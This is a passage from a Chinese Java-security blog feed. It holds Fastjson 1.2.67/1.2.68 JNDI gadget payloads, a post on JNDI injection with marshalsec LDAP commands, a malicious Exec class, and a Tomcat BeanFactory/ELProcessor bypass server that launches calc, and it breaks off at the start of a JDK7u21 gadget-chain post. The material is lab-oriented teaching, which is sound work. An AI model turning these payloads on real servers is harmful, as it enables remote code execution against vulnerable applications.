id="1-2-67"><a href="#1-2-67" class="headerlink" title="1.2.67"></a>1.2.67</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1389/Exploit\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;  </span><br><span class="line">或  </span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.caucho.config.types.ResourceRef&quot;</span>,<span class="string">&quot;lookupName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;value&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.value&quot;</span>&#125;&#125;|</span><br></pre></td></tr></table></figure><h2 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span>, <span class="string">&quot;tmJndiName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;tmFromJndi&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;transactionManager&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.transactionManager&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span>, <span class="string">&quot;tmJndiName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;tmFromJndi&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;transactionManager&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.transactionManager&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-JNDI注入</title>
      <link href="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇不讲 基础，直接讲jdk版本的绕过，没基础的小伙伴可以看看其他师傅的文章</p><h1 id="8u121-lt-jdk-lt-8u191版本绕过-JNDI-LDAP"><a href="#8u121-lt-jdk-lt-8u191版本绕过-JNDI-LDAP" class="headerlink" title="8u121&lt;jdk&lt;8u191版本绕过(JNDI+LDAP)"></a>8u121&lt;jdk&lt;8u191版本绕过(JNDI+LDAP)</h1><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>注意 java 版本 我这里使用的是 jdk8u141<br>使用 <a href="https://github.com/RandomRobbieBF/marshalsec-jar">marshalsec</a>构建ldap服务,服务端监听:</p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:7777/#Exec 1099 </code><br><code>http://127.0.0.1:7777/为本地服务，Exec是恶意文件，1099是开启的ldap服务端口(默认为1389) </code></p><p>在exec 目录下开启本地服务：</p><p><code>python -m http.server 7777 </code></p><p>JNDILADPClient.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">public class JNDILDAPClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.lookup(&quot;ldap://127.0.0.1:1099/Exec&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Exec.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Exec &#123;</span><br><span class="line">    public Exec() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Client运行发起请求</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/1.jpg"></p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>在lookup处打断点：</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/2.png"></p><p>在一路的 lookup 后 来到 p_lookup</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/3.png"></p><p>然后又调用 c_lookup()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">protected Object p_lookup(Name var1, Continuation var2) throws NamingException &#123;</span><br><span class="line">    Object var3 = null;</span><br><span class="line">    HeadTail var4 = this.p_resolveIntermediate(var1, var2);</span><br><span class="line">    switch (var4.getStatus()) &#123;</span><br><span class="line">        case 2:</span><br><span class="line">            var3 = this.c_lookup(var4.getHead(), var2);</span><br><span class="line">            if (var3 instanceof LinkRef) &#123;</span><br><span class="line">                var2.setContinue(var3, var4.getHead(), this);</span><br><span class="line">                var3 = null;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 c_lookup 中，在下方会调用 <code>decodeObject()</code>,其中参数的值就是我们传入的LDAP的值</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/4.jpg"></p><p>跟进 这个decodeObject() </p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/5.jpg"></p><p>这里 会进行if判断判断  ①处若我们传入的是序列化数据则会执行if下方的语句进行反序列化(<code>后边高版本绕过会用到留个印象</code>)；②若传入的是远程对象则会调用<code>decodeRmiObject()</code>而我们是一个引用所以直接调用③执行<code>decodeReference()</code></p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/6.jpg"></p><p>decodeReference() 就是一些简单赋值，没啥实际的调用，执行完 回到 LdapCtx.class中，此时的var3属性为：<br><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/7.jpg"></p><p>现在有类名，地址，那么就是准备查找远程恶意类了，接着往下走，会到DirectoryManager.getObjectInstance() ,而 RMI是调用的NamingManager.getObjectInstace， 都是这样通过调用 getObjectInstance 方法 走出自己类所对应的 getObjectInstance,跟进 :</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/8.png"></p><p>加载 Exec:</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/9.jpg"></p><p>所以<code>codebase</code>也就是所谓的远程URL (<code>http://127.0.0.1:7777/</code>)。然后在这个URL的基础上去找文件：</p><p><code>clas = helper.loadClass(factoryName, codebase);</code></p><p>调用Class.forName并制定了类加载来加载类，这样可以加载到<code>http://127.0.0.1:7777/Exec.class</code>。再联想一下之前的知识，Class.forName加载类且第二个参数是true（默认也是true）会进行类的加载，也就是静态代码块。因此这时候静态代码块的代码可以执行。</p><p><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/10.jpg"><br>成功加载到了clas后，再 <code>return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</code>，调用它的newInstance()，从而调用了无参构造器，执行了无参构造器里面的代码，这也是为什么我们把恶意代码写道无参构造器里面的原因。<br><img src="/2023/05/25/JAVA-JNDI%E6%B3%A8%E5%85%A5/11.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>至此跟踪完毕，知道了为什么可以调用静态代码块，无参构造器。还有在图5的一点就是 JNDI支持传入的类型有三种：</p><ul><li>序列化对象 –&gt; 对应<code>deserializeObject((byte[])attr.get(), cl);</code></li></ul><p>​</p><ul><li>远程对象 –&gt; 对应<code>decodeRmiObject((String)attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(),(String)attr.get(), codebases);</code><br>​</li><li>ldap对象 –&gt; 对应<code>decodeReference(attrs, codebases);</code>​<br>这里因为我们是一个引用对象，所以他会走到​<code>decodeReference(attrs, codebases);</code>​<br>在​<code>decodeReference</code>​这个里面呢主要就是获取恶意类的类名，地址之类的，解析完成：</li></ul><p>因为我们这里用的是引用对象，而高版本会用到另外两个。</p><h1 id="高版本绕过-JDK-gt-8u191"><a href="#高版本绕过-JDK-gt-8u191" class="headerlink" title="高版本绕过(JDK&gt;8u191)"></a>高版本绕过(JDK&gt;8u191)</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在 8u191 之后，LDAP那里加了一个 trustURLCodebase 判断， 无法再用 LDAP 加载。因此，LDAP 和RMI 都无法使用，我们想要从 远程加载类就变的很困难，虽然无法再使用远程加载类，但绕过限制的方法也随之出现。代码的逻辑：<br>从本地尝试加载类-&gt;加载不到则从远程加载类<br>那么无法从远程加载类，是否可以从本机尝试加载这个类，并达到RCE的目的呢？</p><h2 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h2><ol><li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li><li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li></ol><h2 id="利用本地-Class-作为-Reference-Factory"><a href="#利用本地-Class-作为-Reference-Factory" class="headerlink" title="利用本地 Class 作为 Reference Factory"></a>利用本地 Class 作为 Reference Factory</h2><p>之前了解的 JNDI 知道 恶意代码是写在 static ，无参构造器中，如果要利用本地 class 作为 Reference Fatory ，必须要满足三个条件。</p><ul><li>实现了 javax.naming.spi.ObjectFactory 接口</li><li>因为​<code>RegistryContext</code>​是RMI对应的利用类即利用RMI且不加载远程地址就会执行这个利用链。而<code>NamingManager.getObjectInstance</code> ​又会执行<code>getObjectFactoryFromReference</code>​<br>  <code>getObjectFactoryFromReference</code> ​这是一个静态方法，这个静态方法会返回<code>ObjectFactory</code>​类型,并且这里使用了newInstance构造，所以这个类还需要满足拥有无参构造方法</li></ul><p>看到 ObjectFactory 此接口 ，拥有  getObjectInstance 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好 <code>org.apache.naming.factory.BeanFactory</code>​ 满足要求，在 BeanFacory 中 的 <code>getObjectInstance</code>​可以精心构造，从而执行恶意代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;  </span><br><span class="line">        NamingException ne;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference)obj;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();  </span><br><span class="line">            Class&lt;?&gt; beanClass = <span class="literal">null</span>;  </span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">            <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    beanClass = tcl.loadClass(beanClassName);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var26) &#123;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    beanClass = Class.forName(beanClassName);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var25) &#123;  </span><br><span class="line">                    var25.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (beanClass == <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Class not found: &quot;</span> + beanClassName);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);  </span><br><span class="line">                PropertyDescriptor[] pda = bi.getPropertyDescriptors();  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.newInstance();  </span><br><span class="line">                <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);  </span><br><span class="line">                Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">                String value;  </span><br><span class="line">                String propName;  </span><br><span class="line">                <span class="type">int</span> i;  </span><br><span class="line">                <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    value = (String)ra.getContent();  </span><br><span class="line">                    Class&lt;?&gt;[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;;  </span><br><span class="line">                    String[] arr$ = value.split(<span class="string">&quot;,&quot;</span>);  </span><br><span class="line">                    i = arr$.length;  </span><br><span class="line">  </span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; i; ++i$) &#123;  </span><br><span class="line">                        <span class="type">String</span> <span class="variable">param</span> <span class="operator">=</span> arr$[i$];  </span><br><span class="line">                        param = param.trim();  </span><br><span class="line">                        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> param.indexOf(<span class="number">61</span>);  </span><br><span class="line">                        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">                            propName = param.substring(index + <span class="number">1</span>).trim();  </span><br><span class="line">                            param = param.substring(<span class="number">0</span>, index).trim();  </span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                            propName = <span class="string">&quot;set&quot;</span> + param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + param.substring(<span class="number">1</span>);  </span><br><span class="line">                        &#125;  </span><br><span class="line">  </span><br><span class="line">                        <span class="keyword">try</span> &#123;  </span><br><span class="line">                            forced.put(param, beanClass.getMethod(propName, paramTypes));  </span><br><span class="line">                        &#125; <span class="keyword">catch</span> (SecurityException | NoSuchMethodException var24) &#123;  </span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Forced String setter &quot;</span> + propName + <span class="string">&quot; not found for property &quot;</span> + param);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                Enumeration&lt;RefAddr&gt; e = ref.getAll();  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">                    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">                        <span class="keyword">do</span> &#123;  </span><br><span class="line">                            <span class="keyword">do</span> &#123;  </span><br><span class="line">                                <span class="keyword">do</span> &#123;  </span><br><span class="line">                                    <span class="keyword">do</span> &#123;  </span><br><span class="line">                                        <span class="keyword">do</span> &#123;  </span><br><span class="line">                                            <span class="keyword">if</span> (!e.hasMoreElements()) &#123;  </span><br><span class="line">                                                <span class="keyword">return</span> bean;  </span><br><span class="line">                                            &#125;  </span><br><span class="line">  </span><br><span class="line">                                            ra = (RefAddr)e.nextElement();  </span><br><span class="line">                                            propName = ra.getType();  </span><br><span class="line">                                        &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;factory&quot;</span>));  </span><br><span class="line">                                    &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;scope&quot;</span>));  </span><br><span class="line">                                &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;auth&quot;</span>));  </span><br><span class="line">                            &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;forceString&quot;</span>));  </span><br><span class="line">                        &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;singleton&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">                        value = (String)ra.getContent();  </span><br><span class="line">                        Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];  </span><br><span class="line">                        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Method)forced.get(propName);  </span><br><span class="line">                        <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] = value;  </span><br><span class="line">  </span><br><span class="line">                            <span class="keyword">try</span> &#123;  </span><br><span class="line">                                method.invoke(bean, valueArray);</span><br></pre></td></tr></table></figure><p>简单来说就是 实例化了 Bean.class  然后调用一个 setter 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">Method method = (Method)forced.get(propName);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"></span><br><span class="line">method.invoke(bean, valueArray);</span><br></pre></td></tr></table></figure><p>实际上 并不一定是 setter ，可以使某个函数为setter ，只不过要调用的函数必须是参数为一个String 的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用<code>javax.el.ELProcessor</code>来rce即可。<code>ELProcessor</code>的eval方法会对EL表达式求值，实现RCE。不过前提是tomcat8，因为tomcat7中没有<code>ELProcessor</code>。</p><p>Server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">39654</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;kuis=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;kuis&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:39654/Exploit&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-原生反序列化利用链JDK7u21</title>
      <link href="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/"/>
      <url>/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/</url>
      
        <content type="html"><![CDATA[<h1 id="说两句"><a href="#说两句" class="headerlink" title="说两句"></a>说两句</h1><p>在前面的分析利用链中，大部分都基于 InvokerTransformer 和 TemplatesImpl 这两个类去执行命令，而其他的一些利用链也是经过这两个类去进行变形，从而产生新的利用链，而在Jdk7u21中，也是基于 TemplatesImpl 去实现的，另一个核心点就是 </p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>我们先来看看 这个老朋友AnnotationInvocationHandler类中的equalsImpl方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 